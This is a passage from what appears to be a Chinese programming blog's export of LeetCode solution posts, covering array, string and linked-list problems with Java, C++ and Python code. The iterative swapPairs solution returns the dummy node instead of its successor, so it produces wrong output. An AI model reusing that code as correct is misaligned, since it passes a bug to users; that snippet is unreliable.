<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><blockquote>
<p>递归思想，要想知道3层，需要知道2层，需要知道1层，了解了按照递归的思路来实现即可！</p>
</blockquote>
<h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><p>这题思路很简单，但是实际操作的时候还是遇到了一点问题。在于生成新的字符串时，对于连续的相同的字符进行判断记录。</p>
<ul>
<li><p>如果当前字符和前一个字符不相等，则应该将当前字符的数量和当前字符添加到新字符串中。</p>
</li>
<li><p>如果当前字符和前一个字符相等，则应该将对该字符的计数加一。</p>
</li>
<li><p>对于循环的起始应该是从1开始比较好，结束应该是上一次返回的字符串长度加一。</p>
</li>
</ul>
<p>附：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">countAndSay</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"1"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		String preStr = countAndSay(n-<span class="number">1</span>);</span><br><span class="line">		StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">		<span class="keyword">int</span> count = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;preStr.length()+<span class="number">1</span>;i++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(i==preStr.length() || preStr.charAt(i)!=preStr.charAt(i-<span class="number">1</span>))&#123;</span><br><span class="line">				sb.append(count).append(preStr.charAt(i-<span class="number">1</span>));</span><br><span class="line">				count = <span class="number">1</span>;</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				count++;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> sb.toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>这类题需要快速定位到递归的思路，这种层层相扣的，当前结果需要上次的结果作为输入的问题。在一定程度上使用递归效果很不错。另外对于连续性问题的判断，这种循环的解决技巧也应该谨记！</p>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>recursion(递归)</tag>
        <tag>连续性判断</tag>
      </tags>
  </entry>
  <entry>
    <title>27. Remove Element</title>
    <url>/2017/03/16/27-Remove-Element/</url>
    <content><![CDATA[<p>Given an array and a value, remove all instances of that value in place and return the new length.</p>
<p>Do not allocate extra space for another array, you must do this in place with constant memory.</p>
<p>The order of elements can be changed. It doesn’t matter what you leave beyond the new length.</p>
<p>Example:<br>Given input array nums = <font color="rgb(199,37,78)"><code>[3,2,2,3]</code></font>, val = <font color="rgb(199,37,78)"><code>3</code></font></p>
<p>Your function should return length = 2, with the first two elements of nums being 2.<br><a id="more"></a></p>
<h1 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h1><blockquote>
<p>利用了和26. Remove Duplicates from Sorted Array相同的思想，时间复杂度O(n)<br><br>利用length既可以该值既可以表示索引，也可以表示索引长度，将比较重复的逻辑换成比较数组元素和val即可！</p>
</blockquote>
<p><strong>Java实现</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:Java</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/remove-element/</span></span><br><span class="line"><span class="comment"> * Beats : 80%</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">removeElement</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// length is the return array's length</span></span><br><span class="line">        <span class="keyword">int</span> length = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">        	<span class="keyword">if</span>(nums[i] == val) </span><br><span class="line">        		<span class="keyword">continue</span>;</span><br><span class="line">            <span class="comment">//we can also use length as index to cover val</span></span><br><span class="line">        	nums[length] = nums[i];</span><br><span class="line">        	length++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> length;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><strong>c++实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:c++</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/remove-element/</span></span><br><span class="line"><span class="comment"> * Beats : 51.4%</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">removeElement</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.size(); i++)&#123;</span><br><span class="line">			<span class="keyword">if</span> (nums[i] != val)&#123;</span><br><span class="line">				nums[index++] = nums[i];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> index;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>python实现</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">removeElement</span><span class="params">(self, nums, val)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :type val: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">            <span class="keyword">if</span>(nums[i] != val):</span><br><span class="line">                nums[index] = nums[i]</span><br><span class="line">                index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> index</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这类题目其实考察数组的操作，其目的不在于返回一个答案数组，而只是需要前n项符合答案的数组就可以了。</p>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title>26. Remove Duplicates from Sorted Array</title>
    <url>/2017/03/16/26-Remove-Duplicates-from-Sorted-Array/</url>
    <content><![CDATA[<p>Given a sorted array, remove the duplicates in place such that each element appear only once and return the new length.</p>
<p>Do not allocate extra space for another array, you must do this in place with constant memory.</p>
<p>For example,<br>Given input array nums = <font color="rgb(199,37,78)"><code>[1,1,2]</code></font>,</p>
<p>Your function should return length = <font color="rgb(199,37,78)"><code>2</code></font>, with the first two elements of nums being <font color="rgb(199,37,78)"><code>1</code></font> and <font color="rgb(199,37,78)"><code>2</code></font> respectively. It doesn’t matter what you leave beyond the new length.</p>
<a id="more"></a>
<h1 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h1><blockquote>
<p>去除重复元素，并返回数组长度。<br><br>注意：这题并不是真正的让你删除重复元素，题目要求你只是返回结果的数组长度length，并在输入数组的基础上改写前length项为不相同数据。<br><br>需要设置一个长度length（该值既可以表示索引，也可以表示索引长度），遍历数组，当数组相邻元素重复时，将当前索引处的值赋给length为索引处，同时length++；<br><br>遍历完成后，返回length。</p>
</blockquote>
<p><strong>Java实现</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:Java</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/remove-duplicates-from-sorted-array/submissions/</span></span><br><span class="line"><span class="comment"> * Beats : 99%</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">removeDuplicates</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> index = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; nums.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] == nums[i-<span class="number">1</span>])&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            nums[index++] = nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> index;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>c++实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:c++</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/remove-duplicates-from-sorted-array/submissions/</span></span><br><span class="line"><span class="comment"> * Beats : 98.54%</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">removeDuplicates</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (nums.size() &lt; <span class="number">2</span>) <span class="keyword">return</span> nums.size();</span><br><span class="line">		<span class="keyword">int</span> index = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; nums.size(); i++)&#123;</span><br><span class="line">			<span class="keyword">if</span> (nums[i] == nums[i - <span class="number">1</span>])&#123;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			nums[index++] = nums[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> index;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>python实现</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">removeDuplicates</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        index = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(nums)):</span><br><span class="line">            <span class="keyword">if</span> nums[i] == nums[i<span class="number">-1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                nums[index] = nums[i]</span><br><span class="line">                index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> index</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title>24. Swap Nodes in Pairs</title>
    <url>/2017/03/07/24-Swap-Nodes-in-Pairs/</url>
    <content><![CDATA[<p>Given a linked list, swap every two adjacent nodes and return its head.</p>
<p>For example,<br>Given <font color="rgb(199,37,78)"><code>1-&gt;2-&gt;3-&gt;4</code></font>, you should return the list as <font color="rgb(199,37,78)"><code>2-&gt;1-&gt;4-&gt;3</code></font>.</p>
<p>Your algorithm should use only constant space. You may not modify the values in the list, only nodes itself can be changed.</p>
<a id="more"></a>
<h1 id="Solution："><a href="#Solution：" class="headerlink" title="Solution："></a>Solution：</h1><h2 id="循环解决"><a href="#循环解决" class="headerlink" title="循环解决"></a>循环解决</h2><blockquote>
<p>先明确链表元素交换，这样就好做了！</p>
</blockquote>
<p><img src="http://i.imgur.com/Yxya3WY.png" alt></p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><blockquote>
<ol>
<li>通过temp节点获取first和second的索引，并且交换两个元素；</li>
<li>重新获取temp元素，并重复步骤1。</li>
</ol>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">swapPairs</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">	ListNode node = <span class="keyword">new</span> ListNode(<span class="number">9527</span>);</span><br><span class="line">	node.next = head;</span><br><span class="line">	ListNode temp = node;</span><br><span class="line">	<span class="keyword">while</span>(temp.next!=<span class="keyword">null</span> &amp;&amp; temp.next.next!=<span class="keyword">null</span>)&#123;</span><br><span class="line">		ListNode first = temp.next;</span><br><span class="line">		ListNode second = temp.next.next;</span><br><span class="line">		first.next = second.next;</span><br><span class="line">		second.next = first;</span><br><span class="line">		temp.next = second;</span><br><span class="line">		temp = first;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNode</span> </span>&#123;</span><br><span class="line">     <span class="keyword">int</span> val;</span><br><span class="line">     ListNode next;</span><br><span class="line">     ListNode(<span class="keyword">int</span> x) &#123; val = x; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="递归解决"><a href="#递归解决" class="headerlink" title="递归解决"></a>递归解决</h2><p><img src="http://i.imgur.com/O2rttX2.png" alt></p>
<blockquote>
<p>利用递归的思路解决，把一次操作封装成函数，借助递归实现。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//recursion: the recursive stack uses O(n) space</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">swapPairs</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(head == <span class="keyword">null</span> || head.next == <span class="keyword">null</span>)</span><br><span class="line">		<span class="keyword">return</span> head;</span><br><span class="line">	ListNode node = head.next;</span><br><span class="line">	head.next = swapPairs(node.next);</span><br><span class="line">	node.next = head;</span><br><span class="line">	<span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNode</span> </span>&#123;</span><br><span class="line">     <span class="keyword">int</span> val;</span><br><span class="line">     ListNode next;</span><br><span class="line">     ListNode(<span class="keyword">int</span> x) &#123; val = x; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>recursion(递归)</tag>
        <tag>LinkedList(链表)</tag>
      </tags>
  </entry>
  <entry>
    <title>3. Longest Substring Without Repeating Characters</title>
    <url>/2017/02/10/3-Longest-Substring-Without-Repeating-Characters/</url>
    <content><![CDATA[<p>Given a string, find the length of the longest substring without repeating characters.</p>
<p><strong>Examples:</strong></p>
<p>Given <font><code>&quot;abcabcbb&quot;</code></font>, the answer is <font><code>&quot;abc&quot;</code></font>, which the length is 3.</p>
<p>Given <font><code>&quot;bbbbb&quot;</code></font>, the answer is <font><code>&quot;b&quot;</code></font>, with the length of 1.</p>
<p>Given <font><code>&quot;pwwkew&quot;</code></font>, the answer is <font><code>&quot;wke&quot;</code></font>, with the length of 3. Note that the answer must be a substring, <font><code>&quot;pwke&quot;</code></font> is a <em>subsequence</em> and not a <strong>substring</strong>.</p>
<style type="text/css">
font{
color:rgb(199,37,78)
}
</style>

<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><blockquote>
<p>求最长不重复序列。</p>
</blockquote>
<h2 id="循环比对"><a href="#循环比对" class="headerlink" title="循环比对"></a>循环比对</h2><blockquote>
<p>对于所有可能的情况进行比较，找到最长的不重复子序列并保存长度。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(s.length()==<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> len = <span class="number">0</span>,i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(i&lt;s.length())&#123;</span><br><span class="line">		<span class="keyword">int</span> j = i+<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">while</span>(j&lt;s.length())&#123;</span><br><span class="line">			<span class="keyword">if</span>(s.substring(i,j).contains(String.valueOf(s.charAt(j))))</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			j++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>((j-i)&gt;len)</span><br><span class="line">			len = j-i;</span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>s.substring(i,j).contains(String.valueOf(s.charAt(j)))</code>这个判断完成了核心的逻辑判断。</p>
<h2 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h2><p><strong>分析</strong></p>
<p>这个方法我觉得并没有多少优势，使用下面HashSet方法表述的方法更清晰。</p>
<blockquote>
<p>The basic idea is, keep a hashmap which stores the characters in string as keys and their positions as values, and keep two pointers which define the max substring. move the right pointer to scan through the string , and meanwhile update the hashmap. If the character is already in the hashmap, then move the left pointer to the right of the same character last found. Note that the two pointers can only move forward.</p>
<p>使用Map来存储，<code>字符-索引</code>；<br><br>两个索引：低索引和高索引，默认值为0<br><br>当高索引遍历到重复字符时，低索引将移动到重复字符第一次出现的位置+1（但是有一定很重要，低索引只能增不能减），那么现在高索引处的字符在<code>低索引---高索引</code>组成的子字符串是唯一的。<br><br>每次在比较并存储在最长的子序列。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LongestSubstringWithoutRepeatingCharacters</span></span>&#123;</span><br><span class="line">	<span class="comment">//HashMap   This method is very obscure!</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">if</span>(s.length()==<span class="number">0</span>)</span><br><span class="line">    		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    	<span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">    	Map&lt;Character,Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;i&lt;s.length();i++)&#123;</span><br><span class="line">    		<span class="keyword">if</span>(map.containsKey(s.charAt(i)))&#123;</span><br><span class="line">    			<span class="comment">//Note that the two pointers can only move forward.</span></span><br><span class="line">    			j = Math.max(j,map.get(s.charAt(i))+<span class="number">1</span>);</span><br><span class="line">    			<span class="comment">// j = map.get(s.charAt(i))+1;</span></span><br><span class="line">    			System.out.println(<span class="string">"j="</span>+j);</span><br><span class="line">    		&#125;</span><br><span class="line">    		map.put(s.charAt(i),i);</span><br><span class="line">    		max = Math.max(max,i-j+<span class="number">1</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">    	<span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>分析：</strong></p>
<p><img src="http://i.imgur.com/aZO47aN.png" alt></p>
<h2 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h2><p><strong>快慢指针法</strong></p>
<blockquote>
<p>使用快慢指针来解决这个问题，快指针用来添加不存在的字符；而当存在重复字符时，慢指针的作用是用来从字符串的头部删除字符，直到重复的字符被删除为止。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LongestSubstringWithoutRepeatingCharacters</span></span>&#123;</span><br><span class="line">	<span class="comment">//HashSet</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">if</span>(s.length()==<span class="number">0</span>)</span><br><span class="line">    		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    	Set&lt;Character&gt; set = <span class="keyword">new</span> HashSet&lt;Character&gt;();</span><br><span class="line">    	<span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>,max = <span class="number">0</span>;</span><br><span class="line">    	<span class="keyword">while</span>(j&lt;s.length())&#123;</span><br><span class="line">    		<span class="keyword">if</span>(!set.contains(s.charAt(j)))&#123;</span><br><span class="line">    			set.add(s.charAt(j++));</span><br><span class="line">    			max = Math.max(max,set.size());</span><br><span class="line">    		&#125;<span class="keyword">else</span></span><br><span class="line">    			set.remove(s.charAt(i++));</span><br><span class="line">    	&#125;</span><br><span class="line">    	<span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>分析：</strong></p>
<blockquote>
<p>利用了快慢指针来解决这个问题，没有重复元素时，快指针用来添加不存在字符；反之，慢指针用来删除头字符。<br><br>这样做的好处是利用快慢指针可以快速的得到所有可能的不重复子串。</p>
</blockquote>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>最简单易懂的方法是使用循环遍历出所有可能的结果，并筛选出最长的子字符串。时间复杂度达到了O(N2)<br><br>使用HashMap或者HashSet简化时间复杂度到O(N)。</p>
</blockquote>
]]></content>
      <tags>
        <tag>Optimize(优化)</tag>
        <tag>LeetCode-medium</tag>
        <tag>快慢指针</tag>
      </tags>
  </entry>
  <entry>
    <title>2. Add Two Numbers</title>
    <url>/2017/02/08/2-Add-Two-Numbers/</url>
    <content><![CDATA[<p>You are given two linked lists representing two non-negative numbers. The digits are stored in reverse order and each of their nodes contain a <code>single digit</code>. Add the two numbers and return it as a linked list.</p>
<p><strong>Input</strong>: (2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)<br><br><strong>Output</strong>: 7 -&gt; 0 -&gt; 8</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><blockquote>
<ol>
<li><p>每一个节点上都包含一个单个的数字，那么也就是说进位值最多为1；</p>
</li>
<li><p>结尾处如果存在进位，则应该新建节点。</p>
</li>
</ol>
</blockquote>
<p><strong>版本一</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Add2Numbers</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">addTwoNumbers</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">        ListNode digit_1 = l1;</span><br><span class="line">        ListNode digit_2 = l2;</span><br><span class="line">        ListNode p = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        ListNode sum = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        p.next = sum;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(digit_1 != <span class="keyword">null</span> || digit_2 != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> addUp = (digit_1 != <span class="keyword">null</span> ? digit_1.val : <span class="number">0</span>) + (digit_2 != <span class="keyword">null</span> ? digit_2.val : <span class="number">0</span>) + carry;</span><br><span class="line">            sum.next = (carry = addUp / <span class="number">10</span>) == <span class="number">0</span> ? <span class="keyword">new</span> ListNode(addUp) : <span class="keyword">new</span> ListNode(addUp % <span class="number">10</span>);</span><br><span class="line">            <span class="keyword">if</span>(digit_1 != <span class="keyword">null</span>)</span><br><span class="line">                digit_1 = digit_1.next;</span><br><span class="line">            <span class="keyword">if</span>(digit_2 != <span class="keyword">null</span>)</span><br><span class="line">                digit_2 = digit_2.next;</span><br><span class="line">            sum = sum.next;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(carry &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            sum.next = <span class="keyword">new</span> ListNode(carry);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> p.next.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Add2Numbers</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">addTwoNumbers</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">        ListNode c1 = l1;</span><br><span class="line">        ListNode c2 = l2;</span><br><span class="line">        ListNode d = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        ListNode result = d;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(c1!=<span class="keyword">null</span> || c2!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="comment">//we need sum/10  </span></span><br><span class="line">            sum /= <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">if</span>(c1!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                sum += c1.val;</span><br><span class="line">                c1 = c1.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(c2!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                sum += c2.val;</span><br><span class="line">                c2 = c2.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//① very clever!</span></span><br><span class="line">            d.next = <span class="keyword">new</span> ListNode(sum%<span class="number">10</span>);</span><br><span class="line">            d = d.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//②if we have carry</span></span><br><span class="line">        <span class="keyword">if</span>(sum/<span class="number">10</span>==<span class="number">1</span>)</span><br><span class="line">            d.next = <span class="keyword">new</span> ListNode(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> result.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNode</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ListNode</span><span class="params">(<span class="keyword">int</span> val)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.val = val;</span><br><span class="line">    &#125;</span><br><span class="line">    ListNode next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>① 处直接取模，不需要判断，因为你需要个位上的数字，那么无论数字大于还是小于10都可以取模得到个位上的数字。</p>
<p>② 处是对结尾处进位进行判断，由于每一位最大为9，所以结尾处只需判断是否需要进位，需要进位1即可。</p>
</blockquote>
<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><blockquote>
<p>这道题主要考察了进位运算在链表的使用情况，难点在代码优化。如何写出简洁、高效的算法是目标。而不能局限于问题的解决！</p>
</blockquote>
]]></content>
      <tags>
        <tag>Optimize(优化)</tag>
        <tag>LeetCode-medium</tag>
        <tag>位运算</tag>
        <tag>LinkedList(链表)</tag>
      </tags>
  </entry>
  <entry>
    <title>Longest Common Substring</title>
    <url>/2017/01/22/Longest-Common-Substring/</url>
    <content><![CDATA[<p>Write a function to find the longest common substring amongst two strings.</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="循环查找"><a href="#循环查找" class="headerlink" title="循环查找"></a>循环查找</h2><blockquote>
<p>思路：</p>
<ol>
<li>双循环嵌套，对两个字符串每一个字符进行对比；</li>
<li>如果相同，则应该继续比较，找到当前索引开始的最长相同字符串长度；</li>
<li>每次找到的相同字符串并不一定是最长的，所以需要再做一次比较，保存最长的子串的索引。</li>
</ol>
</blockquote>
